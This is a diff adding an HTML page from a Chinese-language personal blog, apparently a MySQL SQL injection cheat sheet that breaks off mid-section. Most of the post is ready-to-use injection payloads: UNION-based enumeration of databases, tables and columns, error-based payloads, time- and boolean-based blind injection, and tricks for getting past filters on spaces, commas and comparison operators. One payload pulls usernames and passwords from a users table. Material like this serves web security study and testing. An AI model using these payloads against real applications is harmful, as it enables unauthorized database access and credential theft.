@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SQL注入手册…">
+<meta name="keywords" content="SQL Injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入一把梭">
+<meta property="og:url" content="https://p2hm1n.github.io/2019/06/07/SQL注入一把梭/index.html">
+<meta property="og:site_name" content="ONE PIECE">
+<meta property="og:description" content="SQL注入手册…">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://a2.qpic.cn/psb?/V10Iej344PJUNc/WGjygp3zP*HGy5yJnHverk8N3OUAqogAk*u*kyzmu6w!/m/dFUBAAAAAAAAnull">
+<meta property="og:updated_time" content="2019-06-09T08:43:30.203Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入一把梭">
+<meta name="twitter:description" content="SQL注入手册…">
+<meta name="twitter:image" content="http://a2.qpic.cn/psb?/V10Iej344PJUNc/WGjygp3zP*HGy5yJnHverk8N3OUAqogAk*u*kyzmu6w!/m/dFUBAAAAAAAAnull">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://p2hm1n.github.io/2019/06/07/SQL注入一把梭/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SQL注入一把梭 | ONE PIECE</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ONE PIECE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">P2hm1n's blog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/06/07/SQL注入一把梭/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P2hm1n">
+      <meta itemprop="description" content="ONE PIECE">
+      <meta itemprop="image" content="/images/lufei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ONE PIECE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入一把梭
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-06-07 16:05:13" itemprop="dateCreated datePublished" datetime="2019-06-07T16:05:13+08:00">2019-06-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-06-09 16:43:30" itemprop="dateModified" datetime="2019-06-09T16:43:30+08:00">2019-06-09</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>SQL注入手册…</p>
+<a id="more"></a>
+
+<h1 id="Mysql一把梭"><a href="#Mysql一把梭" class="headerlink" title="Mysql一把梭"></a>Mysql一把梭</h1><h2 id="常用命令一把梭"><a href="#常用命令一把梭" class="headerlink" title="常用命令一把梭"></a>常用命令一把梭</h2><p><strong>一些基本信息</strong></p>
+<blockquote>
+<p>MySQL版本 <code>version()</code></p>
+</blockquote>
+<blockquote>
+<p>当前用户名  <code>user()</code></p>
+</blockquote>
+<blockquote>
+<p>数据库名 <code>database()</code></p>
+</blockquote>
+<blockquote>
+<p>数据库路径 <code>@@datadir</code></p>
+</blockquote>
+<blockquote>
+<p>操作系统版本 <code>@@version_compile_os</code></p>
+</blockquote>
+<blockquote>
+<p>安装 MySQL 的安装路径  <code>@@basedir</code></p>
+</blockquote>
+<br>
+
+
+<h2 id="UNION注入一把梭"><a href="#UNION注入一把梭" class="headerlink" title="UNION注入一把梭"></a>UNION注入一把梭</h2><h3 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h3><blockquote>
+<p>注意：Mysql要大于5.0</p>
+</blockquote>
+<p>找到注入点后获取字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by num</span><br></pre></td></tr></table></figure>
+
+<p>查看哪些地方有字段的回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2.</span>..,n</span><br></pre></td></tr></table></figure>
+
+<p>获取系统数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p>直接获取当前数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库中的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+
+<p>获取表中的字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> tadble_name=<span class="string">'&lt;你取得的表名&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p>获取各个字段值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">group_concat</span>(&lt;获取到的字段<span class="number">1</span>&gt;,&lt;获取到的字段<span class="number">2</span>&gt;) <span class="keyword">from</span> &lt;当前表名&gt;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="UNION-JOIN-注入"><a href="#UNION-JOIN-注入" class="headerlink" title="UNION + JOIN 注入"></a>UNION + JOIN 注入</h3><blockquote>
+<p>适用于：逗号被过滤</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="keyword">database</span>())c;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="报错注入一把梭"><a href="#报错注入一把梭" class="headerlink" title="报错注入一把梭"></a>报错注入一把梭</h2><blockquote>
+<p>若有报错信息则选择报错注入</p>
+</blockquote>
+<p><strong>UpdateXml(有长度限制,最长32位)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果concat被过滤了，可以使用MAKE_SET函数</p>
+</blockquote>
+<br>
+
+<p><strong>ExtractValue(有长度限制,最长32位)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and extractvalue(1, concat(0x7e, (<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果concat被过滤了，可以使用MAKE_SET函数</p>
+</blockquote>
+<br>
+
+<p><strong>exp(5.5.5以上)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">普通查询</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line">得到表名：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line"></span><br><span class="line">得到列名：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line"></span><br><span class="line">检索数据：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~ (<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">':'</span>,<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>mysql&gt;5.5.53时，则不能返回查询结果</p>
+</blockquote>
+<br>
+
+<p><strong>floor(需要三个函数支持)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>count(*)、rand()、group by三者缺一不可</p>
+</blockquote>
+<p><a href="https://www.jianshu.com/p/8c2343705100" target="_blank" rel="noopener">floor完整的注入流程</a></p>
+<br>
+
+<p><strong>其余报错</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GeometryCollection()</span><br><span class="line"></span><br><span class="line">id = 1 AND GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>都不怎么好用</p>
+</blockquote>
+<br>
+
+<h2 id="时间，布尔盲注一把梭"><a href="#时间，布尔盲注一把梭" class="headerlink" title="时间，布尔盲注一把梭"></a>时间，布尔盲注一把梭</h2><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p><strong>sleep</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>if判断语句，条件为假，执行sleep</p>
+</blockquote>
+<br>
+
+<p><strong>BENCHMARK</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在运行过程中占用大量的cpu资源</p>
+</blockquote>
+<br>
+
+<p><strong>笛卡尔积</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),%d,<span class="number">1</span>))&lt;%d,(<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B,information_schema.tables C),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查询数据量极大的表造成延时。</p>
+</blockquote>
+<br>
+
+<p><strong>不正确正则</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="number">1</span>)=<span class="string">'1'</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="keyword">concat</span>(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>)) <span class="keyword">RLIKE</span> <span class="string">'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;'r'  </span><br><span class="line">right(user(),1)&gt;'r'  </span><br><span class="line">substr(user(),1,1)='r'  </span><br><span class="line">mid(user(),1,1)='r' </span><br><span class="line">greatest("sed",database())= "sed" //返回最大值再与字符串比较</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">least</span>(<span class="string">"sea"</span>,<span class="keyword">database</span>())=<span class="string">"sea"</span>; //返回最小值再与字符串比较</span><br><span class="line">    </span><br><span class="line">//不使用逗号 </span><br><span class="line">user() regexp '^[a-z]'</span><br><span class="line">user() like 'root%' //注意_/%通配符，建议写脚本的时候时候写到字符集最后面</span><br><span class="line">POSITION('root' in user())</span><br><span class="line">mid(user() from 1 for 1)='r'</span><br><span class="line">mid(user() from 1)='r'</span><br><span class="line">substr(user() from 1 for 1)='r'</span><br><span class="line">substr(user() from 1)='r'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ASCII()、ORD()和CHAR()函数一般用做辅助。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Bypass一把梭"><a href="#Bypass一把梭" class="headerlink" title="Bypass一把梭"></a>Bypass一把梭</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p><strong>两个空格代替一个空格，用Tab代替空格，注释代替空格</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 </span><br><span class="line"><span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>括号绕过空格</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1'and(sleep(ascii(substr(database(),1,1))=109)) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>空格被过滤，括号没有被过滤，可以用括号绕过</p>
+</blockquote>
+<br>
+
+<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p><strong>盲注（substr(),mid(),limit）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">//对于limit可以使用offset来绕过</span><br><span class="line">limit 0,1 等价于 limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>直接替换为like注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'ro%'</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意通配符 <code>%</code></p>
+</blockquote>
+<br>
+
+<p><strong>union + join注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     </span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤比较符号"><a href="#过滤比较符号" class="headerlink" title="过滤比较符号"></a>过滤比较符号</h3><p><strong>过滤了等号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原代码：<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span></span><br><span class="line"></span><br><span class="line">regexp: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> REGEXP <span class="string">'^1$'</span></span><br><span class="line"></span><br><span class="line">!&lt;&gt;: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> !(<span class="keyword">id</span>&lt;&gt;<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span>: <span class="keyword">select</span> <span class="string">'user'</span> <span class="keyword">in</span> (<span class="string">'user'</span>);    字符串都是可以用16进制代替的. </span><br><span class="line"></span><br><span class="line">用函数绕过: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1),  greatest()</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>过滤了大于小于</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">greatest(a,b)，返回a和b中较大的那个数。</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">1</span></span><br><span class="line">等价</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">123</span>)=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="过滤了if"><a href="#过滤了if" class="headerlink" title="过滤了if"></a>过滤了if</h3><p><strong>case…when…then…else来代替</strong></p>
